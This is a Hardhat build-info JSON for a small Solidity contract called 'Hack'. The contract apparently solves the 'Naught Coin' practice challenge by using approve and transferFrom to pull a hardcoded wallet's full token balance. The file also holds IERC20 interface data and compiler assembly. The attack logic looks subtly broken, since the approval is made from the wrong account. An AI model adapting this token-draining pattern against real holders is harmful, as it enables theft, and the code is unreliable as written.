{
	"id": "37025ef28cab8edeaf8a44facf80a635",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.0",
	"solcLongVersion": "0.8.0+commit.c7dfd78e",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/hackNaughtyCoin.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\nimport '@openzeppelin/contracts/token/ERC20/IERC20.sol';\r\npragma solidity ^0.8.0;\r\ncontract Hack{\r\n    IERC20 public naughtyCoin;\r\n    address myWallet = 0xdB01d94217308046a792D864b16A35837aa52B86;\r\n    constructor(address _address) {\r\n        naughtyCoin = IERC20(_address);\r\n    }\r\n    function balance() public view returns (uint){\r\n        uint amount = naughtyCoin.balanceOf(myWallet);\r\n        return amount;\r\n    }\r\n    function hackContract() public {\r\n        uint balancet = balance();\r\n        naughtyCoin.approve(address(this), balancet);\r\n        naughtyCoin.transferFrom(myWallet, address(this), balancet);\r\n        \r\n    }\r\n    \r\n}"
			},
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"IERC20": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "account",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"details": "Interface of the ERC20 standard as defined in the EIP.",
						"events": {
							"Approval(address,address,uint256)": {
								"details": "Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance."
							},
							"Transfer(address,address,uint256)": {
								"details": "Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero."
							}
						},
						"kind": "dev",
						"methods": {
							"allowance(address,address)": {
								"details": "Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called."
							},
							"approve(address,uint256)": {
								"details": "Sets `amount` as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event."
							},
							"balanceOf(address)": {
								"details": "Returns the amount of tokens owned by `account`."
							},
							"totalSupply()": {
								"details": "Returns the amount of tokens in existence."
							},
							"transfer(address,uint256)": {
								"details": "Moves `amount` tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							},
							"transferFrom(address,address,uint256)": {
								"details": "Moves `amount` tokens from `from` to `to` using the allowance mechanism. `amount` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event."
							}
						},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.0+commit.c7dfd78e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"Interface of the ERC20 standard as defined in the EIP.\",\"events\":{\"Approval(address,address,uint256)\":{\"details\":\"Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.\"},\"Transfer(address,address,uint256)\":{\"details\":\"Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero.\"}},\"kind\":\"dev\",\"methods\":{\"allowance(address,address)\":{\"details\":\"Returns the remaining number of tokens that `spender` will be allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default. This value changes when {approve} or {transferFrom} are called.\"},\"approve(address,uint256)\":{\"details\":\"Sets `amount` as the allowance of `spender` over the caller's tokens. Returns a boolean value indicating whether the operation succeeded. IMPORTANT: Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 Emits an {Approval} event.\"},\"balanceOf(address)\":{\"details\":\"Returns the amount of tokens owned by `account`.\"},\"totalSupply()\":{\"details\":\"Returns the amount of tokens in existence.\"},\"transfer(address,uint256)\":{\"details\":\"Moves `amount` tokens from the caller's account to `to`. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"},\"transferFrom(address,address,uint256)\":{\"details\":\"Moves `amount` tokens from `from` to `to` using the allowance mechanism. `amount` is then deducted from the caller's allowance. Returns a boolean value indicating whether the operation succeeded. Emits a {Transfer} event.\"}},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":\"IERC20\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/token/ERC20/IERC20.sol\":{\"keccak256\":\"0x9750c6b834f7b43000631af5cc30001c5f547b3ceb3635488f140f60e897ea6b\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5a7d5b1ef5d8d5889ad2ed89d8619c09383b80b72ab226e0fe7bde1636481e34\",\"dweb:/ipfs/QmebXWgtEfumQGBdVeM6c71McLixYXQP5Bk6kKXuoY4Bmr\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"contracts/hackNaughtyCoin.sol": {
				"Hack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_address",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "balance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "hackContract",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "naughtyCoin",
							"outputs": [
								{
									"internalType": "contract IERC20",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/hackNaughtyCoin.sol\":116:679  contract Hack{\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/hackNaughtyCoin.sol\":187:229  0xdB01d94217308046a792D864b16A35837aa52B86 */\n  0xdb01d94217308046a792d864b16a35837aa52b86\n    /* \"contracts/hackNaughtyCoin.sol\":168:229  address myWallet = 0xdB01d94217308046a792D864b16A35837aa52B86 */\n  0x01\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/hackNaughtyCoin.sol\":236:315  constructor(address _address) {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/hackNaughtyCoin.sol\":298:306  _address */\n  dup1\n    /* \"contracts/hackNaughtyCoin.sol\":277:288  naughtyCoin */\n  0x00\n  dup1\n    /* \"contracts/hackNaughtyCoin.sol\":277:307  naughtyCoin = IERC20(_address) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/hackNaughtyCoin.sol\":236:315  constructor(address _address) {\r... */\n  pop\n    /* \"contracts/hackNaughtyCoin.sol\":116:679  contract Hack{\r... */\n  jump(tag_6)\n    /* \"#utility.yul\":7:150   */\ntag_8:\n  0x00\n    /* \"#utility.yul\":95:101   */\n  dup2\n    /* \"#utility.yul\":89:102   */\n  mload\n    /* \"#utility.yul\":80:102   */\n  swap1\n  pop\n    /* \"#utility.yul\":111:144   */\n  tag_10\n    /* \"#utility.yul\":138:143   */\n  dup2\n    /* \"#utility.yul\":111:144   */\n  tag_11\n  jump\t// in\ntag_10:\n    /* \"#utility.yul\":70:150   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":156:440   */\ntag_3:\n  0x00\n    /* \"#utility.yul\":275:277   */\n  0x20\n    /* \"#utility.yul\":263:272   */\n  dup3\n    /* \"#utility.yul\":254:261   */\n  dup5\n    /* \"#utility.yul\":250:273   */\n  sub\n    /* \"#utility.yul\":246:278   */\n  slt\n    /* \"#utility.yul\":243:245   */\n  iszero\n  tag_13\n  jumpi\n    /* \"#utility.yul\":291:292   */\n  0x00\n    /* \"#utility.yul\":288:289   */\n  dup1\n    /* \"#utility.yul\":281:293   */\n  revert\n    /* \"#utility.yul\":243:245   */\ntag_13:\n    /* \"#utility.yul\":334:335   */\n  0x00\n    /* \"#utility.yul\":359:423   */\n  tag_14\n    /* \"#utility.yul\":415:422   */\n  dup5\n    /* \"#utility.yul\":406:412   */\n  dup3\n    /* \"#utility.yul\":395:404   */\n  dup6\n    /* \"#utility.yul\":391:413   */\n  add\n    /* \"#utility.yul\":359:423   */\n  tag_8\n  jump\t// in\ntag_14:\n    /* \"#utility.yul\":349:423   */\n  swap2\n  pop\n    /* \"#utility.yul\":305:433   */\n  pop\n    /* \"#utility.yul\":233:440   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":446:542   */\ntag_15:\n  0x00\n    /* \"#utility.yul\":512:536   */\n  tag_17\n    /* \"#utility.yul\":530:535   */\n  dup3\n    /* \"#utility.yul\":512:536   */\n  tag_18\n  jump\t// in\ntag_17:\n    /* \"#utility.yul\":501:536   */\n  swap1\n  pop\n    /* \"#utility.yul\":491:542   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":548:674   */\ntag_18:\n  0x00\n    /* \"#utility.yul\":625:667   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":618:623   */\n  dup3\n    /* \"#utility.yul\":614:668   */\n  and\n    /* \"#utility.yul\":603:668   */\n  swap1\n  pop\n    /* \"#utility.yul\":593:674   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":680:802   */\ntag_11:\n    /* \"#utility.yul\":753:777   */\n  tag_21\n    /* \"#utility.yul\":771:776   */\n  dup2\n    /* \"#utility.yul\":753:777   */\n  tag_15\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":746:751   */\n  dup2\n    /* \"#utility.yul\":743:778   */\n  eq\n    /* \"#utility.yul\":733:735   */\n  tag_22\n  jumpi\n    /* \"#utility.yul\":792:793   */\n  0x00\n    /* \"#utility.yul\":789:790   */\n  dup1\n    /* \"#utility.yul\":782:794   */\n  revert\n    /* \"#utility.yul\":733:735   */\ntag_22:\n    /* \"#utility.yul\":723:802   */\n  pop\n  jump\t// out\n    /* \"contracts/hackNaughtyCoin.sol\":116:679  contract Hack{\r... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/hackNaughtyCoin.sol\":116:679  contract Hack{\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x14f719d0\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x7ca2474e\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xb69ef8a8\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/hackNaughtyCoin.sol\":136:161  IERC20 public naughtyCoin */\n    tag_3:\n      tag_6\n      tag_7\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      tag_8\n      swap2\n      swap1\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/hackNaughtyCoin.sol\":460:670  function hackContract() public {\r... */\n    tag_4:\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      stop\n        /* \"contracts/hackNaughtyCoin.sol\":321:454  function balance() public view returns (uint){\r... */\n    tag_5:\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/hackNaughtyCoin.sol\":136:161  IERC20 public naughtyCoin */\n    tag_7:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/hackNaughtyCoin.sol\":460:670  function hackContract() public {\r... */\n    tag_11:\n        /* \"contracts/hackNaughtyCoin.sol\":502:515  uint balancet */\n      0x00\n        /* \"contracts/hackNaughtyCoin.sol\":518:527  balance() */\n      tag_17\n        /* \"contracts/hackNaughtyCoin.sol\":518:525  balance */\n      tag_13\n        /* \"contracts/hackNaughtyCoin.sol\":518:527  balance() */\n      jump\t// in\n    tag_17:\n        /* \"contracts/hackNaughtyCoin.sol\":502:527  uint balancet = balance() */\n      swap1\n      pop\n        /* \"contracts/hackNaughtyCoin.sol\":538:549  naughtyCoin */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/hackNaughtyCoin.sol\":538:557  naughtyCoin.approve */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x095ea7b3\n        /* \"contracts/hackNaughtyCoin.sol\":566:570  this */\n      address\n        /* \"contracts/hackNaughtyCoin.sol\":573:581  balancet */\n      dup4\n        /* \"contracts/hackNaughtyCoin.sol\":538:582  naughtyCoin.approve(address(this), balancet) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_18\n      swap3\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_20\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_20:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_22\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_22:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n      pop\n        /* \"contracts/hackNaughtyCoin.sol\":593:604  naughtyCoin */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/hackNaughtyCoin.sol\":593:617  naughtyCoin.transferFrom */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x23b872dd\n        /* \"contracts/hackNaughtyCoin.sol\":618:626  myWallet */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/hackNaughtyCoin.sol\":636:640  this */\n      address\n        /* \"contracts/hackNaughtyCoin.sol\":643:651  balancet */\n      dup5\n        /* \"contracts/hackNaughtyCoin.sol\":593:652  naughtyCoin.transferFrom(myWallet, address(this), balancet) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_25\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_26\n      jump\t// in\n    tag_25:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_27\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_27:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_29:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_30\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_30:\n      pop\n        /* \"contracts/hackNaughtyCoin.sol\":460:670  function hackContract() public {\r... */\n      pop\n      jump\t// out\n        /* \"contracts/hackNaughtyCoin.sol\":321:454  function balance() public view returns (uint){\r... */\n    tag_13:\n        /* \"contracts/hackNaughtyCoin.sol\":361:365  uint */\n      0x00\n        /* \"contracts/hackNaughtyCoin.sol\":377:388  uint amount */\n      dup1\n        /* \"contracts/hackNaughtyCoin.sol\":391:402  naughtyCoin */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/hackNaughtyCoin.sol\":391:412  naughtyCoin.balanceOf */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x70a08231\n        /* \"contracts/hackNaughtyCoin.sol\":413:421  myWallet */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/hackNaughtyCoin.sol\":391:422  naughtyCoin.balanceOf(myWallet) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_32\n      swap2\n      swap1\n      tag_33\n      jump\t// in\n    tag_32:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_34\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_34:\n      pop\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_36\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_36:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_37\n      swap2\n      swap1\n      tag_38\n      jump\t// in\n    tag_37:\n        /* \"contracts/hackNaughtyCoin.sol\":377:422  uint amount = naughtyCoin.balanceOf(myWallet) */\n      swap1\n      pop\n        /* \"contracts/hackNaughtyCoin.sol\":440:446  amount */\n      dup1\n        /* \"contracts/hackNaughtyCoin.sol\":433:446  return amount */\n      swap2\n      pop\n      pop\n        /* \"contracts/hackNaughtyCoin.sol\":321:454  function balance() public view returns (uint){\r... */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:144   */\n    tag_40:\n      0x00\n        /* \"#utility.yul\":92:98   */\n      dup2\n        /* \"#utility.yul\":86:99   */\n      mload\n        /* \"#utility.yul\":77:99   */\n      swap1\n      pop\n        /* \"#utility.yul\":108:138   */\n      tag_42\n        /* \"#utility.yul\":132:137   */\n      dup2\n        /* \"#utility.yul\":108:138   */\n      tag_43\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":67:144   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":150:293   */\n    tag_44:\n      0x00\n        /* \"#utility.yul\":238:244   */\n      dup2\n        /* \"#utility.yul\":232:245   */\n      mload\n        /* \"#utility.yul\":223:245   */\n      swap1\n      pop\n        /* \"#utility.yul\":254:287   */\n      tag_46\n        /* \"#utility.yul\":281:286   */\n      dup2\n        /* \"#utility.yul\":254:287   */\n      tag_47\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":213:293   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":299:577   */\n    tag_24:\n      0x00\n        /* \"#utility.yul\":415:417   */\n      0x20\n        /* \"#utility.yul\":403:412   */\n      dup3\n        /* \"#utility.yul\":394:401   */\n      dup5\n        /* \"#utility.yul\":390:413   */\n      sub\n        /* \"#utility.yul\":386:418   */\n      slt\n        /* \"#utility.yul\":383:385   */\n      iszero\n      tag_49\n      jumpi\n        /* \"#utility.yul\":431:432   */\n      0x00\n        /* \"#utility.yul\":428:429   */\n      dup1\n        /* \"#utility.yul\":421:433   */\n      revert\n        /* \"#utility.yul\":383:385   */\n    tag_49:\n        /* \"#utility.yul\":474:475   */\n      